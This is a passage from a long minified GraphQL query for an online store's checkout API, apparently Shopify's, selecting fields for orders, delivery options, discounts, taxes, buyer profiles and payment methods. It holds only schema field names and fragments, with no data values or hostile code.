MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}memberships{...ProposalMembershipsFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection supportsVaulting __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies popupEnabled}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies popupEnabled paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name paymentMethodIdentifier configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken supportsVaulting sandboxTestMode}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label coordinates{latitude longitude __typename}__typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount 